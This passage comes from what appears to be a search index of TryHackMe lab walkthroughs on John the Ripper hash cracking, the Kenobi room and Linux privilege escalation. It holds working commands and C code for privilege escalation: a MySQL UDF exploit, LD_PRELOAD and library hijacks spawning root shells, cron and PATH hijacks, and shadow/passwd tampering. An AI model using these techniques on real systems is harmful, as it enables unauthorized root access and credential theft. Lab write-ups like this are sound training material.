completed.\n</code></pre>"},{"location":"walkthroughs/thm/johntheripper/#cracking-windows-authentication-hashes","title":"Cracking Windows Authentication Hashes","text":"<p>Windows authentication hashes are hashed versions of passwords that are stored by the operating system in a local Security Account Manager (SAM) database located in the Window's registry. In order to obtain these hashes, a user must be a privileged user on the Windows machine.</p> <p>NThash is the hash format that modern Windows OS machines use to store user and service passwords. These hashes are commonly referred to as \"NTLM\" which references the previous version of Windows formats for hashing passwords known as \"LM\" and hench \"NT/LM\" or \"NTLM\".</p> <p>NTLM hashes can be obtained by dumping the SAM database on a Windows machine but using a tool like Mimikatz or from the Active Directory Database: <code>NTDS.dit</code>. With these hashes, an attacker may not need to crack the hash to continue privilege escalation as it is often possible to conduct a \"pass the hash\" attack instead.</p> <p>Let's look at cracking an example NTLM hash.</p>"},{"location":"walkthroughs/thm/johntheripper/#question-1-what-do-we-need-to-set-the-format-flag-to-in-order-to-crack-this","title":"Question 1 - What do we need to set the \"format\" flag to, in order to crack this?","text":"<p>In John, we need to set the hash format to NT.</p>"},{"location":"walkthroughs/thm/johntheripper/#question-2-what-is-the-cracked-value-of-this-password","title":"Question 2 - What is the cracked value of this password?","text":"<pre><code>\u250c\u2500\u2500(siachen\u327fkali)-[~/CyberSec/THM/johntheripper/task_five_hashes]\n\u2514\u2500$ john --format=nt --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt ntlm.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (NT [MD4 128/128 AVX 4x3])\nWarning: no OpenMP support for this hash type, consider --fork=4\nPress 'q' or Ctrl-C to abort, almost any other key for status\nmushroom         (?)     \n1g 0:00:00:00 DONE (2023-02-28 22:10) 20.00g/s 61440p/s 61440c/s 61440C/s lance..dangerous\nUse the \"--show --format=NT\" options to display all of the cracked passwords reliably\nSession completed. \n</code></pre>"},{"location":"walkthroughs/thm/johntheripper/#cracking-etcshadow-hashes","title":"Cracking /etc/shadow Hashes","text":"<p>The <code>/etc/shadow</code> file is where Linux machines store their password hashes. The file also stores additional information such as the date of the last password change and password expiration information. The <code>/etc/shadow</code> file contains one entry per line for each user or user account on the system and is usually only accessible by the root user.</p> <p>In order to crack <code>/etc/shadow</code> passwords, the file must be combined with the <code>/etc/passwd</code> file in order for John to understand the data it's being give. To do this, a tool called <code>unshadow</code> which is built into the John suite can be used. The syntax is as follows:</p> <p><pre><code>unshadow [path to /etc/passwd] [path to /etc/shadow] &gt; [output file]\n</code></pre> Note that when using <code>unshadow</code>, one can either use the entire <code>/etc/passwd</code> and <code>/etc/shadow</code> file or use only the relevant line from each.</p> <p>The output from <code>unshadow</code> can then be fed into John. Although a hash format doesn't need to be specified, it is good practice to provide the appropriate hash format of <code>--format=sha512crypt</code>.</p> <p>Let's look at a practical example.</p>"},{"location":"walkthroughs/thm/johntheripper/#question-1-what-is-the-root-password","title":"Question 1 - What is the root password?","text":"<p>We don't need to use <code>unshadow</code> to combine the <code>/etc/passwd</code> file with <code>/etc/shadow</code> as the the hash file provided by the challenge has already done this step for us. All we need to do is crack the hash with John.</p> <pre><code>\u250c\u2500\u2500(siachen\u327fkali)-[~/CyberSec/THM/johntheripper/task_six_hashes]\n\u2514\u2500$ john --format=sha512crypt --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt etchashes.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])\nCost 1 (iteration count) is 5000 for all loaded hashes\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n1234             (root)     \n1g 0:00:00:00 DONE (2023-02-28 22:25) 1.639g/s 2098p/s 2098c/s 2098C/s kucing..poohbear1\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed. \n</code></pre>"},{"location":"walkthroughs/thm/johntheripper/#single-crack-mode","title":"Single Crack Mode","text":"<p>In the Single Crack Mode, John uses only the information provided in the username to try and work out possible passwords heuristically by slightly changing the letters and numbers contained within the username.</p> <p>John uses a technique called word mangling thereby building it's own dictionary based on the information that it has been fed. By using a set of rules called \"mangling rules\" which define how it can mutate the word it started with, John is able to build a wordlist based off of relevant factors for the target it is trying to crack.</p> <p>Single Crack Mode can be used with the following syntax:</p> <p><pre><code>john --single --format=[hash format/type] [path to hash file]\n</code></pre> Note that when using Single Crack Mode, the file format being provided to John needs to be modified by prepending the hash with the username that the hash belongs to. For example given a hash <code>1efee03cdcb96d90ad48ccc7b8666033</code> and a username <code>mike</code>, the file will need to be modified as <code>mike:1efee03cdcb96d90ad48ccc7b8666033</code>.</p> <p>Let's put this into practice.</p>"},{"location":"walkthroughs/thm/johntheripper/#question-1-what-is-jokers-password","title":"Question 1 - What is Joker's password?","text":"<p>Let's start by modifying our hash file to include the username as required by the Single Crack Mode.</p> <p><pre><code>\u250c\u2500\u2500(siachen\u327fkali)-[~/CyberSec/THM/johntheripper/task_seven_hashes]\n\u2514\u2500$ cat hash7.txt\njoker:7bf6d9bb82bed1302f331fc6b816aada\n</code></pre> With the file modified, we can now use John in Single Crack Mode to crack the hash.</p> <pre><code>\u250c\u2500\u2500(siachen\u327fkali)-[~/CyberSec/THM/johntheripper/task_seven_hashes]\n\u2514\u2500$ john --single --format=raw-md5 hash7.txt                                                                     \nUsing default input encoding: UTF-8\nLoaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])\nWarning: no OpenMP support for this hash type, consider --fork=4\nPress 'q' or Ctrl-C to abort, almost any other key for status\nWarning: Only 2 candidates buffered for the current salt, minimum 12 needed for performance.\nJok3r            (joker)     \n1g 0:00:00:00 DONE (2023-02-28 22:38) 16.66g/s 3250p/s 3250c/s 3250C/s j0ker..J0k3r\nUse the \"--show --format=Raw-MD5\" options to display all of the cracked passwords reliably\nSession completed. \n</code></pre>"},{"location":"walkthroughs/thm/johntheripper/#custom-rules","title":"Custom Rules","text":"<p>John allows users to create a custom set of rules to use with the Single Crack Mode which John can then use to dynamically create passwords. This is particularly useful when more information is known about the password structure of the target.</p> <p>Custom rules are defined in the <code>john.conf</code> file typically located at <code>/etc/john/john.conf</code>.</p> <p>For more information on custom rules and associated modifiers, ready through the wiki.</p> <p>The syntax to use custom rules is a follows:</p> <pre><code>john --wordlist=[path to wordlist] --rule=[name of rule] [path to hash file]\n</code></pre>"},{"location":"walkthroughs/thm/johntheripper/#cracking-password-protected-zip-files","title":"Cracking Password Protected Zip Files","text":"<p>John can be used to crack the password on password protected zip files. To do this, <code>zip2john</code> is used to convert the zip file into a hash format that John understands. The hash is then used with John and a wordlist to extract the password.</p> <p>The syntax for using <code>zip2john</code> is as follows:</p> <p><pre><code>zip2john [options] [zip file] &gt; [output hash file]\n</code></pre> Let's look at a practical example.</p>"},{"location":"walkthroughs/thm/johntheripper/#question-1-what-is-the-password-for-the-securezip-file","title":"Question 1 - What is the password for the secure.zip file?","text":"<pre><code>\u250c\u2500\u2500(siachen\u327fkali)-[~/CyberSec/THM/johntheripper/task_nine_hashes]\n\u2514\u2500$ zip2john secure.zip &gt; ziphash.txt\nver 1.0 efh 5455 efh 7875 secure.zip/zippy/flag.txt PKZIP Encr: 2b chk, TS_chk, cmplen=38, decmplen=26, crc=849AB5A6 ts=B689 cs=b689 type=0\n\n\u250c\u2500\u2500(siachen\u327fkali)-[~/CyberSec/THM/johntheripper/task_nine_hashes]\n\u2514\u2500$ cat ziphash.txt                         \nsecure.zip/zippy/flag.txt:$pkzip$1*2*2*0*26*1a*849ab5a6*0*48*0*26*b689*964fa5a31f8cefe8e6b3456b578d66a08489def78128450ccf07c28dfa6c197fd148f696e3a2*$/pkzip$:zippy/flag.txt:secure.zip::secure.zip\n\n\u250c\u2500\u2500(siachen\u327fkali)-[~/CyberSec/THM/johntheripper/task_nine_hashes]\n\u2514\u2500$ john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt ziphash.txt \nUsing default input encoding: UTF-8\nLoaded 1 password hash (PKZIP [32/64])\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\npass123          (secure.zip/zippy/flag.txt)     \n1g 0:00:00:00 DONE (2023-03-01 13:09) 8.333g/s 68266p/s 68266c/s 68266C/s 123456..total90\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed. \n</code></pre>"},{"location":"walkthroughs/thm/johntheripper/#question-2-what-is-the-contents-of-the-flag-inside-the-zip-file","title":"Question 2 - What is the contents of the flag inside the zip file?","text":"<p>Unzip the zip file with the above password to retrieve the flag: THM{w3ll_d0n3_h4sh_r0y4l}</p>"},{"location":"walkthroughs/thm/johntheripper/#cracking-password-protected-rar-archives","title":"Cracking Password Protected RAR Archives","text":"<p>Similar zip files, John can be used to crack passwords on password protected RAR files. This can be accomplished using the <code>rar2john</code> tool with the following syntax:</p> <p><pre><code>rar2john [rar file] &gt; [output hash file]\n</code></pre> The output hash file is then used with John to crack the password.</p> <p>Let's look at a practical example.</p>"},{"location":"walkthroughs/thm/johntheripper/#question-1-what-is-the-password-for-the-securerar-file","title":"Question 1 - What is the password for the secure.rar file?","text":"<pre><code>\u250c\u2500\u2500(siachen\u327fkali)-[~/CyberSec/THM/johntheripper/task_ten_hashes]\n\u2514\u2500$ rar2john secure.rar &gt; rarhash.txt\n\n\u250c\u2500\u2500(siachen\u327fkali)-[~/CyberSec/THM/johntheripper/task_ten_hashes]\n\u2514\u2500$ cat rarhash.txt\nsecure.rar:$rar5$16$b7b0ffc959b2bc55ffb712fc0293159b$15$4f7de6eb8d17078f4b3c0ce650de32ff$8$ebd10bb79dbfb9f8\n\n\u250c\u2500\u2500(siachen\u327fkali)-[~/CyberSec/THM/johntheripper/task_ten_hashes]\n\u2514\u2500$ john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt rarhash.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (RAR5 [PBKDF2-SHA256 128/128 AVX 4x])\nCost 1 (iteration count) is 32768 for all loaded hashes\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\npassword         (secure.rar)     \n1g 0:00:00:00 DONE (2023-03-01 13:15) 5.263g/s 336.8p/s 336.8c/s 336.8C/s 123456..charlie\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n</code></pre>"},{"location":"walkthroughs/thm/johntheripper/#question-2-what-is-the-contents-of-the-flag-inside-the-zip-file_1","title":"Question 2 - What is the contents of the flag inside the zip file?","text":"<p>Use the <code>unrar</code> tool to extract the RAR file to retrieve the flag: THM{r4r_4rch1ve5_th15_t1m3}</p>"},{"location":"walkthroughs/thm/johntheripper/#cracking-ssh-keys-with-john","title":"Cracking SSH Keys with John","text":"<p>John can be used to crack the SSH private key password of id_rsa files. Unless configured otherwise, SSH authentication happens using password alone. However, once can configure a key-based authentication which allows the use of a private id_rsa key as an authentication method to login to a remote machine.</p> <p>Using the the <code>ssh2john</code> tool, we can convert the private id_rsa key to a hash understood by John. The syntax is as follows:</p> <p><pre><code>ssh2john [id_rsa private key file] &gt; [output hash file]\n</code></pre> The hash can then be used with John to crack the password on the id_rsa private key.</p> <p>Let's look at a practical example.</p>"},{"location":"walkthroughs/thm/johntheripper/#question-1-what-is-the-ssh-private-key-password","title":"Question 1 - What is the SSH private key password?","text":"<pre><code>\u250c\u2500\u2500(siachen\u327fkali)-[~/CyberSec/THM/johntheripper/task_eleven_hashes]\n\u2514\u2500$ ssh2john idrsa.id_rsa &gt; idrsa_hash.txt\n\n\u250c\u2500\u2500(siachen\u327fkali)-[~/CyberSec/THM/johntheripper/task_eleven_hashes]\n\u2514\u2500$ john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt idrsa_hash.txt \nUsing default input encoding: UTF-8\nLoaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])\nCost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes\nCost 2 (iteration count) is 1 for all loaded hashes\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nmango            (idrsa.id_rsa)     \n1g 0:00:00:00 DONE (2023-03-01 13:27) 11.11g/s 47644p/s 47644c/s 47644C/s access..mango\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed. \n</code></pre>"},{"location":"walkthroughs/thm/johntheripper/#additional-resources","title":"Additional Resources","text":"<ul> <li>Hash Decrypter</li> <li>Hash Identifier</li> <li>Crackstation</li> </ul>"},{"location":"walkthroughs/thm/kenobi/","title":"Kenobi","text":""},{"location":"walkthroughs/thm/kenobi/#reconosint","title":"Recon/OSINT","text":"<p>Target IP: 10.10.88.133 ($IP)</p>"},{"location":"walkthroughs/thm/kenobi/#enumeration","title":"Enumeration","text":""},{"location":"walkthroughs/thm/kenobi/#nmap-scan","title":"Nmap Scan","text":"<p>Open ports:</p> <p></p> <p>Samba enabled on ports 139 and 445.</p> <p></p> <p>Enumerate for Samba shares on port 445 using Nmap script.</p> <p><pre><code>nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $IP\n</code></pre> </p>"},{"location":"walkthroughs/thm/kenobi/#smbclient","title":"SMBClient","text":"<p>Connect to <code>anonymous</code> share using <code>smbclient</code>. Supply an empty password.</p> <p><pre><code>smbclient //$IP/anonymous\n</code></pre> </p> <p>Download <code>log.txt</code> and examine content. Log file shows that an RSA private and public key pair is saved in <code>/home/kenobi/.ssh/id_rsa</code>.</p>"},{"location":"walkthroughs/thm/kenobi/#rpc","title":"RPC","text":"<p>Enumerate port 111 (RPC service).</p> <p><pre><code>nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $IP\n</code></pre> </p> <p>Found mount <code>/var</code>.</p>"},{"location":"walkthroughs/thm/kenobi/#exploitation","title":"Exploitation","text":"<p>Search <code>ExploitDB</code> or <code>searchsploit</code> for any exploits for <code>ProFTPd version 1.3.5</code>. </p> <p></p> <p>Seems like <code>ProFTPd version 1.3.5</code> is vulnerable to remote command execution using <code>mod_copy module</code>.</p> <p>Note</p> <p>The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.</p> <p>Copy Kenobi's private RSA key using: SITE CPFR and SITE CPTO command.   </p> <p></p> <p>Mount <code>/var</code> to our local machine.</p> <p><pre><code>sudo mkdir /mnt/kenobiNFS\n</code></pre> <pre><code>sudo mount $IP:/var /mnt/kenobiNFS\n</code></pre> </p> <p>Navigate to <code>/tmp</code> directory and  use the Kenobi's <code>id_rsa</code> private key to login through <code>SSH</code>.</p> <p>Setting file permissions on <code>/mnt/kenobiNFS</code> was giving trouble so copied the <code>id_rsa</code> to a local folder and set <code>chmod 600</code> permissions.</p> <p></p> <p>User flag found!</p> <p></p>"},{"location":"walkthroughs/thm/kenobi/#privilege-escalation","title":"Privilege Escalation","text":"<p>Search for system files with SUID bit set.</p> <p><pre><code>find / -perm -u=s -type f 2&gt;/dev/null\n</code></pre> <code>Menu</code> binary looks suspicious.</p> <p></p> <p>Run the <code>menu</code> binary to see what it is.</p> <p></p> <p>Running <code>strings</code> on <code>/usr/bin/menu</code> shows that the binary is running without a full path for <code>curl</code>.</p> <p></p> <p>We can manipulate the fact that this binary executes with root user privileges by manipulating our path to <code>curl</code> to gain a root shell.</p> <p><pre><code>$ cd /tmp\n$ echo /bin/sh &gt; curl\n$ chmod 777 curl\n$ export PATH=/tmp:$PATH\n</code></pre> Here, we echoed <code>/bin/sh</code> to a file named <code>curl</code>, assigned full permissions, and put its location in our path. This means that when <code>/usr/bin/menu</code> is run, it uses our temporary path to execute our modified \"curl binary\" which in turn executes <code>/bin/sh</code> with root privileges.</p> <p>Execute the <code>menu</code> binary again to gain root privileges.</p> <p></p> <p>Found root flag!</p> <p></p>"},{"location":"walkthroughs/thm/linuxprivesc/","title":"Linux PrivEsc","text":""},{"location":"walkthroughs/thm/linuxprivesc/#task-1-introduction","title":"Task 1 - Introduction","text":"<p>The aim of this room is to walk us through a variety of Linux Privilege Escalation techniques. The room provides a vulnerable Debian VM to work on with the credentials: <code>user:password123</code>.</p> <p>Let's begin by connecting to the machine using ssh. Newer versions of OpenSSH have deprecated ssh-rsa so we will need to explicitly tell OpenSSH to use the encryption method. </p> <p><pre><code>$ ssh user@&lt;Machine_IP&gt; -oHostKeyAlgorithms=+ssh-rsa\n</code></pre> Running the id command, we get the following results:</p> <p></p>"},{"location":"walkthroughs/thm/linuxprivesc/#task-2-service-exploits","title":"Task 2 - Service Exploits","text":"<p>In this task, we will be looking at exploiting MySQL for privilege escalation by taking advantage of User Defined Functions (UDF) to run system commands as root via the MySQL service. In order for us to do this, the MySQL service needs to be running on the target as root.</p> <p>UDF functions are language agnostic and can be written in any programming language to be complied natively into a shared library.</p> <p>Let's begin by confirming that the MySQL is running on the VM.</p> <p><pre><code>ps aux | grep mysql\n</code></pre> </p> <p>Based on the results above, we can confirm that the MySQL service is running on the target machine with root privileges.</p> <p>For this task, we are told that MySQL service is running as the root user with a blank password. Alternatively, we can also look in the <code>/etc/mysql/my.cnf</code> file (or other database connection files used by web applications) for any user passwords.</p> <p>Let's confirm the version of MySQL service running on the target machine. We can do this with one of the following commands.</p> <p><pre><code>mysql -V\nmysql -u root -p -e 'select @@version;'\n</code></pre> </p> <p>This version of MySQL has a vulnerability which allows users to run user-defined functions to execute commands.</p> <p></p> <p>The exploit can be downloaded from Exploit DB: raptor_udf2.c</p> <p>Let's download the exploit code onto the target machine and compile the exploit code into a shared object file.</p> <p><pre><code>wget https://www.exploit-db.com/download/1518 -o raptor_udf2.c\n</code></pre> <pre><code>gcc -g -c raptor_udf2.c -fPIC\ngcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc\n</code></pre> </p> <p>We now need to connect to the MySQL database and determine the path of the plugins directory where MySQL stores its UDF functions.</p> <p><pre><code>mysql -u root -p\nshow variables like '%plugin%';\n</code></pre> </p> <p>One additional check we need to do is to check if the variable secure_file_priv is enabled to allow data import and export operations like load_file and load_data functions. A null/empty value means that the variable is disabled and thus we can load data into the database.</p> <p><pre><code>show variables like '%secure_file_priv%';\n</code></pre> </p> <p>Now that we know the location where we need to store our malicious shared library, we can switch to the mysql database and create our user defined function which points to our compiled exploit.</p> <p>Let's switch to the database in question.</p> <p><pre><code>use mysql;\n</code></pre> </p> <p>Now import the shared library by inserting its contents into a table. We will first need to create a table into which we can import the library.</p> <p><pre><code>create table foo(line blob);\ninsert into foo values(load_file('/tmp/raptor_udf2.so'));\n</code></pre> </p> <p>Now select the binary contents in the shared library and dump them into the plugins directory.</p> <p><pre><code>select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';\n</code></pre> </p> <p>Finally, we need to create a function to call the shared library.</p> <p><pre><code>create function do_system returns integer soname 'raptor_udf2.so';\n</code></pre> </p> <p>We can confirm if our function is present in the mysql database.</p> <p><pre><code>select * from mysql.func;\n</code></pre> </p> <p>We can now use the above created function to run system commands which will be executed as root. Let's go ahead and use our function to copy <code>/bin/bash</code> to the <code>/tmp/rootbash</code> and set the SUID bit.</p> <p><pre><code>select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');\n</code></pre> </p> <p>We can exit out of MySQL and execute the <code>/tmp/rootbash</code> to privilege escalation.</p> <p><pre><code>./rootbash -p\n</code></pre> </p> <p>Before continuing to the next task, we need to remove the <code>/tmp/rootbash</code> binary as we will be creating this file again in a future task.</p>"},{"location":"walkthroughs/thm/linuxprivesc/#task-3-weak-file-permissions-readable-etcshadow","title":"Task 3 - Weak File Permissions - Readable /etc/shadow","text":"<p>The <code>/etc/shadow</code> stores encrypted user password hashes and is only accessible to the root user and the shadow group. For more information on <code>/etc/shadow</code> file, see Passwd/Shadow File.</p> <p>In this task, we will be exploiting misconfigured permissions on the <code>/etc/shadow</code> file which makes it globally-readable. Let's start by looking at the permissions.</p> <p><pre><code>ls -l /etc/shadow\n</code></pre> </p> <p>As we can see, the file has been misconfigured to be writeable and readable by all other users. Let's look at the contents of the file.</p> <p><pre><code>cat /etc/shadow\n</code></pre> </p> <p>We can use John the Ripper (John) to extract the root user's password. The process of using John to extract passwords from the <code>/etc/shadow</code> file requires two basic steps. We first have to use a utility called unshadow to combine the contents of <code>/etc/passwd</code> file with the contents of <code>/etc/shadow</code> file. We begin by copying the line for the root user from the <code>/etc/passwd</code> file and the <code>/etc/shadow</code> file to files <code>passwd.txt</code> and <code>shadow.txt</code> respectively. As John is not installed on the target VM, we will need to do these steps locally on our machine.</p> <p><pre><code>head -n 1 /etc/passwd &gt; passwd.txt\nhead -n 1 /etc/shadow &gt; shadow.txt\n</code></pre> </p> <p>Copy the above files (or their contents) to our local machine and then use the unshadow command.</p> <p><pre><code>unshadow passwd.txt shadow.txt &gt; unshadowed.txt\n</code></pre> </p> <p>We now know proceed with using John to extract the password from the hash.</p> <p><pre><code>john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt unshadowed.txt\n</code></pre> </p> <p>With the above credentials we can now privilege escalate to the root user.</p> <p><pre><code>su root\n</code></pre> </p>"},{"location":"walkthroughs/thm/linuxprivesc/#task-4-weak-file-permissions-writeable-etcshadow","title":"Task 4 - Weak File Permissions - Writeable /etc/shadow","text":"<p>In the previous task, we found that the <code>/etc/shadow</code> file was writeable by all other users on the system. With the ability to modify the contents of the file, we can simply replace the root user's current password with a new one of our choosing. For more information on the <code>/etc/shadow</code> file format and password hash generation, see Passwd/Shadow File.</p> <p>To begin, let's generate a new password using the OpenSSL utility which comes pre-installed on most modern Linux operating systems.</p> <p><pre><code>openssl passwd -6 -salt salt pass123\n</code></pre> </p> <p>We can now edit the <code>/etc/shadow</code> file on the target machine and replace the existing password hash with the one we generated above.</p> <p></p> <p>Save the file and exit. We can now use our new credentials <code>root:pass123</code> to privilege escalate to the root user.</p> <p><pre><code>su root\n</code></pre> </p>"},{"location":"walkthroughs/thm/linuxprivesc/#task-5-weak-file-permissions-writable-etcpasswd","title":"Task 5 - Weak File Permissions - Writable /etc/passwd","text":"<p>In this task, we will be looking at weak file permissions on the <code>/etc/passwd</code> file. The <code>/etc/passwd</code> file is normally globally-readable and only the super user has permissions to write to it. A <code>/etc/passwd</code> file with global write permissions allows any user to modify the contents and give themselves root permissions. For more information on exploiting the <code>/etc/passwd</code> file, see Passwd/Shadow File.</p> <p>Let's look at the permissions on the <code>/etc/passwd</code> file for this task.</p> <p><pre><code>ls -l /etc/passwd\n</code></pre> </p> <p>As we can see from the image above, the <code>/etc/passwd</code> file has been marked as writeable by all other users present on the system. As a consequence, we can simply edit the contents of <code>/etc/passwd</code> file and gain root access by appending a new user with root privileges to the file.</p> <p>Let's begin by generating a new password for our new user using the openssl utility.</p> <p><pre><code>openssl passwd pass123\n</code></pre> </p> <p>We can now edit the <code>/etc/passwd</code> file by adding a new user with root privileges with the above password hash.</p> <p></p> <p>We can now switch to the new user using the new password.</p> <p><pre><code>su newroot\n</code></pre> </p>"},{"location":"walkthroughs/thm/linuxprivesc/#task-6-sudo-shell-escape-sequences","title":"Task 6 - Sudo - Shell Escape Sequences","text":"<p>We can list all programs which sudo allows us to run by using the following command:</p> <p><pre><code>sudo -l\n</code></pre> By leveraging GTFOBins, we can attempt to gain privilege escalation with the programs listed via an escape sequence.</p> <p>Let's list all the programs sudo permits us to run as a low privileged user for this task.</p> <p></p> <p>Note that each of the programs listed can be run without a password needed to be supplied due to the <code>NOPASSWD</code> attribute.</p> <p>Let's go ahead and see if we can find a privilege escalation vector using the <code>/usr/bin/find</code> binary. Searching the binary on the GTFOBins, we find that if the <code>/usr/bin/find</code> binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access. We can abuse this by using the <code>-exec</code> flag to execute any system binary (such as <code>/bin/bash</code>) with root privileges.</p> <p><pre><code>sudo find . -exec /bin/bash \\; -quit\n</code></pre> </p> <p>Note that privilege escalation vectors exist all of the remaining binaries (except apache2) listed when running the <code>sudo -l</code> command.</p>"},{"location":"walkthroughs/thm/linuxprivesc/#task-7-sudo-environment-variables","title":"Task 7 - Sudo - Environment Variables","text":"<p>Sudo can be configured to inherit certain environment variables from the user's environment. We can check which environment variables are inherited by looking for the env_keep option when running the <code>sudo -l</code> command.</p> <p></p> <p>In the above example, the LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.</p> <p>We can exploit this by creating a shared object using the following code. Save the code to a file in <code>/tmp/preload.c</code>.</p> <p><pre><code>#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid _init() {\n        unsetenv(\"LD_PRELOAD\");\n        setresuid(0,0,0);\n        system(\"/bin/bash -p\");\n}\n</code></pre> Then create the shared object using the following syntax:</p> <p><pre><code>gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c\n</code></pre> </p> <p>We can now spawn an interactive shell by running one of the programs listed when we run the <code>sudo -l</code> command, while setting the LD_PRELOAD environment to the full path of the new shared object. The interactive shell will be spawned with root privileges due to the listed binary executing with root permissions. Let's see this in action.</p> <p><pre><code>sudo LD_PRELOAD=/tmp/preload.so [binary_name]\n</code></pre> </p> <p>Alternatively, we can also exploit shared libraries used by a program when executing. For example, let's look at the shared libraries used by <code>/usr/sbin/apache2</code> by running the following command:</p> <p><pre><code>ldd /usr/sbin/apache2\n</code></pre> </p> <p>Now let's create a shared object with the same name as one of the listed libraries (eg: libcrypt.so.1) using the following code. Save the code to a file in <code>/tmp/lib_path.c</code>.</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstatic void hijack() __attribute__((constructor));\n\nvoid hijack() {\n        unsetenv(\"LD_LIBRARY_PATH\");\n        setresuid(0,0,0);\n        system(\"/bin/bash -p\");\n}\n</code></pre> <p>Then create the shared object using the following syntax:</p> <p><pre><code>gcc -o /tmp/libcrypt.so.1 -shared -fPIC /tmp/library_path.c\n</code></pre> </p> <p>We can now go ahead and execute the binary while supplying the LD_LIBRARY_PATH environment variable to where our malicious shared object resides. This will spawn an interactive root shell thus gaining our privilege escalation.</p> <p><pre><code>sudo LD_LIBRARY_PATH=/tmp apache2\n</code></pre> </p>"},{"location":"walkthroughs/thm/linuxprivesc/#task-8-cron-jobs-file-permissions","title":"Task 8 - Cron Jobs - File Permissions","text":"<p>By default, Cron runs as root when executing <code>/etc/crontab</code>. Scripts executed by Cron that are editable by an unprivileged user become a vector for privilege escalation. For more information on privilege escalation using Cron Jobs with weak file permissions, see Cron Jobs.</p> <p>Let's begin by looking at the contents of <code>/etc/crontab</code> in order to identify any possible targets.</p> <p></p> <p>In the above example, we can see that two scripts, <code>overwrite.sh</code> and <code>/usr/local/bin/compress.sh</code> ,are scheduled to run every minute. Let's locate the full path of <code>overwrite.sh</code> and look at its file permissions.</p> <p><pre><code>locate overwrite.sh\n</code></pre> </p> <p>Looking at the permissions on the script, we see that it is writeable by any user on the machine. We can exploit this misconfiguration to gain privilege escalation by modifying the script to make a copy of the <code>/bin/bash</code> binary and set the SUID bit on it. Let's see this in action.</p> <p>Let's modify the <code>/usr/local/bin/overwrite.sh</code> file with the following commands:</p> <p><pre><code>cp /bin/bash /tmp/rootbash\nchmod u+s /tmp/rootbash\n</code></pre> </p> <p>Now all we need to do is wait for Cron to run the scheduled task. Execute the <code>/tmp/rootbash</code> binary using the following command to gain root access:</p> <p><pre><code>/tmp/rootbash -p\n</code></pre> </p>"},{"location":"walkthroughs/thm/linuxprivesc/#task-9-cron-jobs-path-environment-variable","title":"Task 9 - Cron Jobs - PATH Environment Variable","text":"<p>If absolute path for a script in a scheduled task in <code>/etc/crontab</code> file is not defined and the PATH variable contains a globally writeable directory as its first entry, we can force Cron to execute a malicious script we control to gain privilege escalation.</p> <p>Let's begin by looking at the contents of the <code>/etc/crontab</code> file again.</p> <p></p> <p>Note that the PATH variable in the above image includes the <code>/home/user</code> directory as the first entry. When a binary or script is executed by Cron, this is will be the first directory it will look in before moving on to <code>/usr/local/sbin</code> and so on.</p> <p>Also note that the scheduled task which executes the overwrite.sh script does not define the absolute path for the script file. Since we have full read and write access to the <code>/home/user</code> directory, we can simply create our own malicious overwrite.sh file on the directory to gain privilege escalation. This is possible because when the scheduled task is executed Cron first looks in the <code>/home/user</code> directory for the overwrite.sh file before looking elsewhere.</p> <p>Let's create our overwrite.sh in the <code>/home/user</code> directory with the following content:</p> <p><pre><code>#!/bin/bash\n\ncp /bin/bash /tmp/rootbash\nchmod u+s /tmp/rootbash\n</code></pre> Give the script executable permission and wait for Cron to execute the scheduled task. Execute the new rootbash binary with the following syntax to get root access:</p> <p><pre><code>/home/user/rootbash -p\n</code></pre> </p>"},{"location":"walkthroughs/thm/linuxprivesc/#task-10-cron-jobs-wildcards","title":"Task 10 - Cron Jobs - Wildcards","text":"<p>A wildcard injection vulnerability occurs when a command uses the wildcard (*) character in an insecure way thus allowing an attacker to change the command's behaviour by injecting command flags. For more information, see Cron Jobs.</p> <p>Let's look at the contents of the second cron job script compress.sh:</p> <p></p> <p>We can see from the results that the script calls the tar utility is being run from the <code>/home/user</code> directory with a wildcard (*). Looking at GTFOBins, we can see that the command line options <code>--checkpoint</code> and <code>--checkpoint-action</code> can allow us to run other commands as part of a checkpoint feature.</p> <p>We can exploit this by forcing the checkpoint feature in the tar utility to execute our malicious script to get privilege escalation.</p> <p>Let's start by creating a script called privesc.sh which copies the <code>/bin/bash</code> binary to the <code>/home/user</code> directory and sets the SUID bit.</p> <p><pre><code>#!/bin/bash\n\ncp 